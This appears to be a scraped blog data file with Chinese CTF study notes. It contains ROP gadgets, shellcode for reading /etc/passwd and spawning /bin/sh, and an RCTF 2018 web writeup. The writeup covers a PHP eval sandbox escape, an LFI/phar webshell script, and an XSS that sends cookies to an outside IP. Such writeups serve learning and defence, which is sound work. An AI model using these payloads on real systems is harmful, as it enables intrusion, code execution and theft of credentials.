class=\"line\">0x000000000000059b : test rax, rax ; je 0x5a7 ; call rax</span><br><span class=\"line\">0x000000000000065e : test rax, rax ; je 0x676 ; pop rbp ; jmp rax</span><br><span class=\"line\">0x00000000000006af : test rax, rax ; je 0x6c6 ; pop rbp ; jmp rax</span><br><span class=\"line\"></span><br><span class=\"line\">Unique gadgets found: 85</span><br><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ROPgadget --binary vuln --all | grep &quot;pop rdi ; ret&quot;</span><br><span class=\"line\">0x00000000000007f3 : pop rdi ; ret</span><br></pre></td></tr></table></figure>\n<h2 id=\"shellcode编写\"><a href=\"#shellcode编写\" class=\"headerlink\" title=\"shellcode编写\"></a>shellcode编写</h2><p>读取/etc/passwd</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">BITS 64 </span><br><span class=\"line\">; Author Mr.Un1k0d3r - RingZer0 Team </span><br><span class=\"line\">; Read /etc/passwd Linux x86_64 Shellcode </span><br><span class=\"line\">; Shellcode size 82 bytes </span><br><span class=\"line\">global _start </span><br><span class=\"line\">section .text </span><br><span class=\"line\">_start: </span><br><span class=\"line\">    jmp _push_filename </span><br><span class=\"line\"></span><br><span class=\"line\">_readfile: </span><br><span class=\"line\">    ; syscall open file </span><br><span class=\"line\">    pop rdi   ; pop path value </span><br><span class=\"line\">    ; NULL byte fix </span><br><span class=\"line\">    xor byte [rdi + 11], 0x41 </span><br><span class=\"line\"></span><br><span class=\"line\">    xor rax, rax </span><br><span class=\"line\">    add al, 2 </span><br><span class=\"line\">    xor rsi, rsi  ; set O_RDONLY flag </span><br><span class=\"line\">    syscall </span><br><span class=\"line\"></span><br><span class=\"line\">    ; syscall read file </span><br><span class=\"line\">    sub sp, 0xfff </span><br><span class=\"line\">    lea rsi, [rsp] </span><br><span class=\"line\">    mov rdi, rax </span><br><span class=\"line\">    xor rdx, rdx </span><br><span class=\"line\">    mov dx, 0xfff   ; size to read </span><br><span class=\"line\">    xor rax, rax </span><br><span class=\"line\">    syscall </span><br><span class=\"line\"></span><br><span class=\"line\">    ; syscall write to stdout </span><br><span class=\"line\">    xor rdi, rdi </span><br><span class=\"line\">    add dil, 1 ; set stdout fd = 1 </span><br><span class=\"line\">    mov rdx, rax </span><br><span class=\"line\">    xor rax, rax </span><br><span class=\"line\">    add al, 1 </span><br><span class=\"line\">    syscall </span><br><span class=\"line\"></span><br><span class=\"line\">    ; syscall exit </span><br><span class=\"line\">    xor rax, rax </span><br><span class=\"line\">    add al, 60 </span><br><span class=\"line\">    syscall </span><br><span class=\"line\"></span><br><span class=\"line\">_push_filename: </span><br><span class=\"line\">    call _readfile </span><br><span class=\"line\">    path: db &quot;/etc/passwdA&quot;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ nasm -f elf64 readfile.asm -o readfile.o </span><br><span class=\"line\">$ for i in $(objdump  -d readfile.o | grep &quot;^ &quot; | cut  -f2); do echo  -n  &apos;\\x&apos;$i; done; echo </span><br><span class=\"line\">\\xeb\\x3f\\x5f\\x80\\x77\\x0b\\x41\\x48\\x31\\xc0\\x04\\x02\\x48\\x31\\xf6\\x0f\\x05\\x6 </span><br><span class=\"line\">6\\x81\\xec\\xff\\x0f\\x48\\x8d\\x34\\x24\\x48\\x89\\xc7\\x48\\x31\\xd2\\x66\\xba\\xff\\x </span><br><span class=\"line\">0f\\x48\\x31\\xc0\\x0f\\x05\\x48\\x31\\xff\\x40\\x80\\xc7\\x01\\x48\\x89\\xc2\\x48\\x31\\ </span><br><span class=\"line\">xc0\\x04\\x01\\x0f\\x05\\x48\\x31\\xc0\\x04\\x3c\\x0f\\x05\\xe8\\xbc\\xff\\xff\\xff\\x2f </span><br><span class=\"line\">\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\\x41</span><br></pre></td></tr></table></figure>\n<p>execve /bin/sh</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.global _start</span><br><span class=\"line\">_start:</span><br><span class=\"line\">    xor %esi, %esi</span><br><span class=\"line\">    # /bin//sh</span><br><span class=\"line\">    movabs $0x68732f2f6e69622f, %rbx</span><br><span class=\"line\">    push %rsi</span><br><span class=\"line\">    push %rbx</span><br><span class=\"line\">    push %rsp</span><br><span class=\"line\">    pop %rdi</span><br><span class=\"line\">    pushq $59</span><br><span class=\"line\">    pop %rax</span><br><span class=\"line\">    xor %edx, %edx</span><br><span class=\"line\">    syscall</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ vim sh.s</span><br><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ as sh.s -o sh.s.o</span><br><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ld sh.s.o -o sh</span><br><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ./sh</span><br><span class=\"line\">$ asd</span><br><span class=\"line\">sh: 1: asd: not found</span><br><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ for i in $(objdump -d sh | grep &quot;^ &quot; | cut -f2); do echo -n &apos;\\x&apos;$i; done; echo</span><br><span class=\"line\">\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05</span><br></pre></td></tr></table></figure>\n<h2 id=\"retn和leave和call\"><a href=\"#retn和leave和call\" class=\"headerlink\" title=\"retn和leave和call\"></a>retn和leave和call</h2><p>retn: </p>\n<blockquote>\n<p>64位: pop rip;  rsp = rsp + 8</p>\n<p>32位: pop eip; esp = esp + 4</p>\n<p>retn N操作：先eip=[esp]，然后esp=esp+4+N</p>\n</blockquote>\n<p>leave:</p>\n<blockquote>\n<p>64位: move rsp rbp; pop rbp               将rbp中的值传给rsp</p>\n<p>32位: move esp ebp; pop ebp             将ebp中的值传给esp</p>\n</blockquote>\n<p>call:</p>\n<blockquote>\n<p>64位: push rip; jump 目的位置</p>\n<p>32位: push eip; jump 目的位置</p>\n</blockquote>\n<h2 id=\"32位寻找偏移\"><a href=\"#32位寻找偏移\" class=\"headerlink\" title=\"32位寻找偏移\"></a>32位寻找偏移</h2><blockquote>\n<p>pattern_create 50</p>\n<p>pattern_offset 字符串</p>\n</blockquote>\n<h2 id=\"有符号整数比较和无符号整数比较\"><a href=\"#有符号整数比较和无符号整数比较\" class=\"headerlink\" title=\"有符号整数比较和无符号整数比较\"></a>有符号整数比较和无符号整数比较</h2><table>\n<thead>\n<tr>\n<th>指令</th>\n<th>含义</th>\n<th>运算符号</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>jbe</td>\n<td>unsigned below or equal (lower or same)</td>\n<td>&lt;=</td>\n</tr>\n<tr>\n<td>jae</td>\n<td>unsigned above or equal (higher or same)</td>\n<td>&gt;=</td>\n</tr>\n<tr>\n<td>jb</td>\n<td>unsigned below (lower)</td>\n<td>&lt;</td>\n</tr>\n<tr>\n<td>ja</td>\n<td>unsigned above (higher)</td>\n<td>&gt;</td>\n</tr>\n<tr>\n<td>jle</td>\n<td>signed less or equal</td>\n<td>&lt;=</td>\n</tr>\n<tr>\n<td>jge</td>\n<td>signed greater or equal</td>\n<td>&gt;=</td>\n</tr>\n<tr>\n<td>jl</td>\n<td>signed less than</td>\n<td>&lt;</td>\n</tr>\n<tr>\n<td>jg</td>\n<td>signed greater than</td>\n<td>&gt;</td>\n</tr>\n</tbody>\n</table>\n<p>从上面的表中可以看出，</p>\n<p>对于无符号（unsigned）整数比较，使用的是单词是above或below；<br>对于有符号(signed)整数比较，则使用的单词是greater或less。</p>\n<h2 id=\"查找argv-0-变量的地址\"><a href=\"#查找argv-0-变量的地址\" class=\"headerlink\" title=\"查找argv[0]变量的地址\"></a>查找argv[0]变量的地址</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gdb-peda$ find /home</span><br><span class=\"line\">Searching for &apos;/home&apos; in: None ranges</span><br><span class=\"line\">Found 6 results, display max 6 items:</span><br><span class=\"line\">[stack] : 0x7fffffffdff6 (&quot;/home/tianji/Desktop/pwn/jarvis/smashes/smashes&quot;)</span><br><span class=\"line\">[stack] : 0x7fffffffe8f4 (&quot;/home/tianji/Desktop/pwn/jarvis&quot;)</span><br><span class=\"line\">[stack] : 0x7fffffffeb12 (&quot;/home/tianji/Desktop/pwn/jarvis/smashes&quot;)</span><br><span class=\"line\">[stack] : 0x7fffffffeb48 (&quot;/home/tianji&quot;)</span><br><span class=\"line\">[stack] : 0x7fffffffeee7 (&quot;/home/tianji/.vimpkg/bin&quot;)</span><br><span class=\"line\">[stack] : 0x7fffffffefc8 (&quot;/home/tianji/Desktop/pwn/jarvis/smashes/smashes&quot;)</span><br><span class=\"line\">gdb-peda$ find 0x7fffffffdff6</span><br><span class=\"line\">Searching for &apos;0x7fffffffdff6&apos; in: None ranges</span><br><span class=\"line\">Found 2 results, display max 2 items:</span><br><span class=\"line\">   libc : 0x7ffff7dd0508 --&gt; 0x7fffffffdff6 (&quot;/home/tianji/Desktop/pwn/jarvis/smashes/smashes&quot;)</span><br><span class=\"line\">[stack] : 0x7fffffffdc68 --&gt; 0x7fffffffdff6 (&quot;/home/tianji/Desktop/pwn/jarvis/smashes/smashes&quot;)</span><br><span class=\"line\">gdb-peda$ distance $rsp 0x7fffffffdc68</span><br><span class=\"line\">From 0x7fffffffda50 to 0x7fffffffdc68: 536 bytes, 134 dwords</span><br></pre></td></tr></table></figure>\n<p>首先搜索字符串”/home”,第一个地址是真实地址，在搜索指向该地址的指针，该指针也就是我们要找的argv[0]的地址。</p>\n<p>当前$rsp的值就是 存在栈溢出变量的地址</p>\n<h2 id=\"ubuntu-16-64位默认加载地址\"><a href=\"#ubuntu-16-64位默认加载地址\" class=\"headerlink\" title=\"ubuntu 16  64位默认加载地址\"></a>ubuntu 16  64位默认加载地址</h2><p>运行程序，然后查看 /proc/pid/maps</p>"},{"title":"rctf2018学习笔记","date":"2018-05-22T06:35:41.000Z","_content":"\n# Web\n\n<!--more-->\n\n赛后总结\n\n## r-cursive\n\n源代码:\n\n```\n<?php\n$token = sha1($_SERVER['REMOTE_ADDR']);\n$dir = '../sandbox/'.$token.'/';\nis_dir($dir) ?: mkdir($dir);\nis_file($dir.'index.php') ?: file_put_contents($dir.'index.php', str_replace('#SHA1#', $token, file_get_contents('./template')));\nswitch($_GET['action'] ?: ''){\n    case 'go':\n        header('Location: http://'.$token.'.sandbox.r-cursive.ml:1337/');\n        break;\n    case 'reset':\n        system('rm -rf '.$dir);\n        break;\n    default:\n        show_source(__FILE__);\n}\n?>\n<style>code{font-family: Segoe Script, Brush Script MT, cursive; font-size: 1.337em;}</style>\n```\n\ntemplate:\n\n```\n<?php\nsha1($_SERVER['REMOTE_ADDR']) === '#SHA1#' ?: die();\n';' === preg_replace('/[^\\W_]+\\((?R)?\\)/', NULL, $_GET['cmd']) ? eval($_GET['cmd']) : show_source(__FILE__);\n```\n\nhttp://589bf872527b686d94b4448c8ea3aed4761eaddc.sandbox.r-cursive.ml:1337/:\n\n```\n<?php\nsha1($_SERVER['REMOTE_ADDR']) === '589bf872527b686d94b4448c8ea3aed4761eaddc' ?: die();\n';' === preg_replace('/[^\\W_]+\\((?R)?\\)/', NULL, $_GET['cmd']) ? eval($_GET['cmd']) : show_source(__FILE__);\n```\n\n```\n?cmd=print(readdir(opendir(getcwd()))); 可以列目录\n?cmd=print(readfile(readdir(opendir(getcwd())))); 读文件\n?cmd=print(dirname(dirname(getcwd()))); print出/var/www\n```\n\n翻阅文档找到`getallheaders()`函数，会返回所有的http请求头，因为header可控，所以可执行任意命令了\n?cmd=print(end(getallheaders()));\n\n```\nGET /?cmd=eval(implode(getallheaders())); HTTP/1.1\nHost: 589bf872527b686d94b4448c8ea3aed4761eaddc.sandbox.r-cursive.ml\ncmd: phpinfo(); //\n```\n\n![1526973311681](/images/rctf/1526973311681.png)\n\n这里是利用auto_prepend来载入sandbox下的init.php来设置沙盒的open_basedir。\n\n```\nYou can use auto_prepend option in php.ini to supply script that will be executed first. There you can setup open_basedir via ini_set() function based on contents of $_SERVER array.\nanswered May 10 '13 at 17:21\ngmsalex\n20816\nYeah, something like this could do it: ini_set('open_basedir',\"/var/www/hosts/$hostname/:/tmp/\"); – Sunry Feb 9 at 1:29\n```\n\n不修改host:\n\n```\nGET /?cmd=eval(end(getallheaders())); HTTP/1.1\nHost: 71aabdeb3d708872c6e00e066ae48b2669834df7.sandbox.r-cursive.ml:1337\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\ncookie: echo ini_get('open_basedir');\n```\n\n```\nHTTP/1.1 200 OK\nDate: Tue, 22 May 2018 07:25:09 GMT\nServer: Apache/2.4.10 (Debian)\nX-Powered-By: PHP/5.6.36\nContent-Length: 64\nConnection: close\nContent-Type: text/html; charset=UTF-8\n\n/var/www/sandbox/71aabdeb3d708872c6e00e066ae48b2669834df7/:/tmp/\n```\n\n修改host:\n\n```\nGET /?cmd=eval(end(getallheaders())); HTTP/1.1\nHost: .sandbox.r-cursive.ml:1337\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\ncookie: echo ini_get('open_basedir');\n```\n\n```\nHTTP/1.1 403 Forbidden\nDate: Tue, 22 May 2018 07:25:36 GMT\nServer: Apache/2.4.10 (Debian)\nContent-Length: 298\nConnection: close\nContent-Type: text/html; charset=iso-8859-1\n\n<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head>\n<title>403 Forbidden</title>\n</head><body>\n<h1>Forbidden</h1>\n<p>You don't have permission to access /\non this server.<br />\n</p>\n<hr>\n<address>Apache/2.4.10 (Debian) Server at .sandbox.r-cursive.ml Port 1337</address>\n</body></html>\n```\n\n报错，403，这是由于sandbox目录下只有init.php，没有index.php的缘故。我们访问init.php试试，200,没有报错。说明open_basedir已经发生变化。\n\n```\nGET /init.php?cmd=eval(end(getallheaders())); HTTP/1.1\nHost: .sandbox.r-cursive.ml:1337\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\ncookie: echo ini_get('open_basedir');\n```\n\n```\nHTTP/1.1 200 OK\nDate: Tue, 22 May 2018 07:26:20 GMT\nServer: Apache/2.4.10 (Debian)\nX-Powered-By: PHP/5.6.36\nContent-Length: 0\nConnection: close\nContent-Type: text/html; charset=UTF-8      \n```\n\ngetflag:\n\n```\nGET /71aabdeb3d708872c6e00e066ae48b2669834df7/index.php?cmd=eval(end(getallheaders())); HTTP/1.1\nHost: .sandbox.r-cursive.ml:1337\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\ncookie: echo ini_get('open_basedir');var_dump(file_get_contents(\"/var/www/sandbox/init.php\"));\n```\n\n```\nHTTP/1.1 200 OK\nDate: Tue, 22 May 2018 06:51:10 GMT\nServer: Apache/2.4.10 (Debian)\nX-Powered-By: PHP/5.6.36\nVary: Accept-Encoding\nContent-Length: 186\nConnection: close\nContent-Type: text/html; charset=UTF-8\n\n/var/www/sandbox/:/tmp/string(148) \"<?php\n    ini_set(\"open_basedir\", $_SERVER['DOCUMENT_ROOT'].\"/:/tmp/\");\n    // flag: RCTF{apache_mod_vhost_alias_should_be_configured_correctly}\n?>\n\"\n```\n\n## Backdoor\n\n![1526992722365](/images/rctf/1526992722365.png)\n\n根据contrab.sh,我们可以得到两个链接：\n\n> http://backdoor.2018.teamrois.cn/post.php?action=upload\n>\n> http://backdoor.2018.teamrois.cn/post.php?action=debugging&count=$debuggers\n\n打开首页，查看源码，得到aaencode之后的js代码:\n\n解密网址:`https://tool.zcmzcm.org/aadecode`\n\n```\ndocument.loginform.onsubmit = function (e) { \n\te.preventDefault()\n\tdocument.getElementById('wp-submit').disabled = 'disabled'\n\tsetTimeout(function () {\n\t\tdocument.getElementById('wp-submit').removeAttribute('disabled')\n\t\talert('Login failed')\n\t\t\"What? Need hint?\"\n\t\t\"index.php is a hint!\"\n\t}, 3000)\n}\n```\n\n说明，不用登录。\n\n查看post.php，发现可能存在LFI。\n\nindex.php,没啥用\n\n> http://backdoor.2018.teamrois.cn/post.php?action=php://filter/read=convert.base64-encode/resource=index\n\npost.php\n\n```\n<?php\nerror_reporting(0);\ninclude $_GET['action'] . '.php';\n```\n\nuploa.php\n\n```\n<?php\nif (!isset($_FILES['file'])) exit;\n$file = $_FILES['file'];\n$zip = new ZipArchive();\nif (true !== $zip->open($file['tmp_name'])) {\n\techo 'No a valid zip';\n\texit;\n}\nif (false === $zip->getFromName('tmp/random.txt')) {\n\techo 'No file';\n\texit;\n}\n\n$dest = 'uploads/' . md5($_SERVER['REMOTE_ADDR']) . hash('sha256', file_get_contents($file['tmp_name'])) . '.zip';\nmove_uploaded_file($file['tmp_name'], $dest);\necho 'Saved into ' . $dest;\n```\n\n利用zip://或者phar://包含。\n\n```python\nimport requests\n\ns = \"Saved into \"\npost_url = \"http://backdoor.2018.teamrois.cn/post.php?action=upload\"\nzip_file = open(\"tmp.zip\",\"rb\")\nupload_file = {'file':zip_file}\nr = requests.post(post_url,files=upload_file)\ndest = r.text[len(s):]\nshell_url = \"http://backdoor.2018.teamrois.cn/post.php?action=phar://\"+ dest + \"/evil\"\nprint(\"[*] shell url: \" + shell_url)\nwhile  True:\n    command = input(\"command: \")\n    payload = {'chybeta': 'system(\"%s\");' % command}\n    r = requests.get(shell_url,params=payload)\n    print(r.text)\n```\n\n## r-blog\n\ntitle:        \"<>1\"\n\ncontent: \"<>1\"\n\n结果：\n\n```\n\n<!doctype html>\n<html lang=\"en\">\n<head>\n\t<meta charset=\"utf-8\">\n\t<meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\">\n\t<link rel=\"stylesheet\" href=\"/assets/css/bootstrap.min.css\">\n\t<link rel=\"stylesheet\" href=\"/assets/css/style.css\">\n\t<link href=\"https://fonts.googleapis.com/css?family=Titillium+Web\" rel=\"stylesheet\">\n\t<title>rBlog 2018</title>\n</head>\n<body>\n<div class=\"container mt-5\">\n\t<div class=\"card\">\n\t\t\t\t<div class=\"card-body\">\n\t\t\t<h2 class=\"card-title\"><>1</h2>\n\t\t\t<p class=\"card-text\">&lt;&gt;2</p>\n\t\t</div>\n\t</div>\n</div>\n<script nonce=\"090c154a21d0fdf5809aff4586fe1eed\" src=\"/assets/js/jquery.min.js\"></script>\n</body>\n</html>\n```\n\ntitle没有过滤，content过滤。\n\ncsp如下:\n\n```\nX-Frame-Options: DENY\nContent-Security-Policy: default-src 'none'; script-src 'nonce-3ae08923a2654e27a3734f7876a5abe0'; frame-src https://www.google.com/recaptcha/; style-src 'self' 'unsafe-inline' fonts.googleapis.com; font-src fonts.gstatic.com; img-src 'self'\n```\n\n我们看到jquery.min.js是相对地址，并且base-uri没有在csp中指定。\n\n所以payload如下:\n\ntitle: `<base href =\"http://【my_server】/\">`\n\ncontent: 随意\n\n在字节的vps上添加jquery.min.js，网址:           `http://[my_server]/assets/js/jquery.min.js`\n\njquery.min.js的内容：\n\n```\nwindow.location.href=\"http://123.207.90.143?\"+document.cookie;\n```\n\n最终结果:\n\n```\n115.159.200.107 - - [22/May/2018:21:39:02 +0800] \"GET /?flag=RCTF{why_the_heck_no_mimetype_for_webp_in_apache2_in_8012};%20hint_for_rBlog_Rev.2=http://rblog.2018.teamrois.cn/blog.php/52c533a30d8129ee4915191c57965ef4c7718e6d HTTP/1.1\" 200 15 \"http://rblog.2018.teamrois.cn/\" \"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/66.0.3359.181 Safari/537.36\"\n\n```\n\n## amp\n\npayload:\n\n> http://amp.2018.teamrois.cn?name=<amp-pixel src=\"https://123.207.90.143:1234/pixel?clientId=CLIENT_ID(FLAG)\"></amp-pixel>\n\n```\n[root@VM_89_224_redhat ~]# nc -lvv 1234\nNcat: Version 6.40 ( http://nmap.org/ncat )\nNcat: Listening on :::1234\nNcat: Listening on 0.0.0.0:1234\nNcat: Connection from 106.120.206.166.\nNcat: Connection from 106.120.206.166:64053.\n\u0016\u0003\u0001\u0002\u0001\u0001�\u0003\u0003�Y���8۲Y�=����6���km����\n                                 ��A It+z���^�vY�$���,�\u00183�'�����*K�Zp\"jj\u0013\u0001\u0013\u0002\u0013\u0003�+�/�,�0̨̩�\u0013�\u0014��/5\n\u0014\u0012\u0004\u0004\u0004\u0001\u0006\u0006\u0001\u0002\u0001\u0001\u0012\u0010\n              \u0002hhttp/1.1uP\n                          \u0002\u00013+)jj\u0001\u001d �ZaV>WB�~\u0013���|�Z��4KM�������Et~-\u0002\u0001\u0001+\n\n��\u0017\u0003\u0003\u0003\u0002\u0003\u0001\n\n```\n\nwriteup:\n\n>  https://github.com/zsxsoft/my-rctf-2018/tree/master/amp\n\n注意，我这里是乱码的原因是，我直接监听1234端口，并不支持ssl。\n\n\n\n","source":"_posts/rctf2018学习笔记.md","raw":"---\ntitle: rctf2018学习笔记\ndate: 2018-05-22 14:35:41\ntags: ctf\n---\n\n# Web\n\n<!--more-->\n\n赛后总结\n\n## r-cursive\n\n源代码:\n\n```\n<?php\n$token = sha1($_SERVER['REMOTE_ADDR']);\n$dir = '../sandbox/'.$token.'/';\nis_dir($dir) ?: mkdir($dir);\nis_file($dir.'index.php') ?: file_put_contents($dir.'index.php', str_replace('#SHA1#', $token, file_get_contents('./template')));\nswitch($_GET['action'] ?: ''){\n    case 'go':\n        header('Location: http://'.$token.'.sandbox.r-cursive.ml:1337/');\n        break;\n    case 'reset':\n        system('rm -rf '.$dir);\n        break;\n    default:\n        show_source(__FILE__);\n}\n?>\n<style>code{font-family: Segoe Script, Brush Script MT, cursive; font-size: 1.337em;}</style>\n```\n\ntemplate:\n\n```\n<?php\nsha1($_SERVER['REMOTE_ADDR']) === '#SHA1#' ?: die();\n';' === preg_replace('/[^\\W_]+\\((?R)?\\)/', NULL, $_GET['cmd']) ? eval($_GET['cmd']) : show_source(__FILE__);\n```\n\nhttp://589bf872527b686d94b4448c8ea3aed4761eaddc.sandbox.r-cursive.ml:1337/:\n\n```\n<?php\nsha1($_SERVER['REMOTE_ADDR']) === '589bf872527b686d94b4448c8ea3aed4761eaddc' ?: die();\n';' === preg_replace('/[^\\W_]+\\((?R)?\\)/', NULL, $_GET['cmd']) ? eval($_GET['cmd']) : show_source(__FILE__);\n```\n\n```\n?cmd=print(readdir(opendir(getcwd()))); 可以列目录\n?cmd=print(readfile(readdir(opendir(getcwd())))); 读文件\n?cmd=print(dirname(dirname(getcwd()))); print出/var/www\n```\n\n翻阅文档找到`getallheaders()`函数，会返回所有的http请求头，因为header可控，所以可执行任意命令了\n?cmd=print(end(getallheaders()));\n\n```\nGET /?cmd=eval(implode(getallheaders())); HTTP/1.1\nHost: 589bf872527b686d94b4448c8ea3aed4761eaddc.sandbox.r-cursive.ml\ncmd: phpinfo(); //\n```\n\n![1526973311681](/images/rctf/1526973311681.png)\n\n这里是利用auto_prepend来载入sandbox下的init.php来设置沙盒的open_basedir。\n\n```\nYou can use auto_prepend option in php.ini to supply script that will be executed first. There you can setup open_basedir via ini_set() function based on contents of $_SERVER array.\nanswered May 10 '13 at 17:21\ngmsalex\n20816\nYeah, something like this could do it: ini_set('open_basedir',\"/var/www/hosts/$hostname/:/tmp/\"); – Sunry Feb 9 at 1:29\n```\n\n不修改host:\n\n```\nGET /?cmd=eval(end(getallheaders())); HTTP/1.1\nHost: 71aabdeb3d708872c6e00e066ae48b2669834df7.sandbox.r-cursive.ml:1337\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\ncookie: echo ini_get('open_basedir');\n```\n\n```\nHTTP/1.1 200 OK\nDate: Tue, 22 May 2018 07:25:09 GMT\nServer: Apache/2.4.10 (Debian)\nX-Powered-By: PHP/5.6.36\nContent-Length: 64\nConnection: close\nContent-Type: text/html; charset=UTF-8\n\n/var/www/sandbox/71aabdeb3d708872c6e00e066ae48b2669834df7/:/tmp/\n```\n\n修改host:\n\n```\nGET /?cmd=eval(end(getallheaders())); HTTP/1.1\nHost: .sandbox.r-cursive.ml:1337\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\ncookie: echo ini_get('open_basedir');\n```\n\n```\nHTTP/1.1 403 Forbidden\nDate: Tue, 22 May 2018 07:25:36 GMT\nServer: Apache/2.4.10 (Debian)\nContent-Length: 298\nConnection: close\nContent-Type: text/html; charset=iso-8859-1\n\n<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head>\n<title>403 Forbidden</title>\n</head><body>\n<h1>Forbidden</h1>\n<p>You don't have permission to access /\non this server.<br />\n</p>\n<hr>\n<address>Apache/2.4.10 (Debian) Server at .sandbox.r-cursive.ml Port 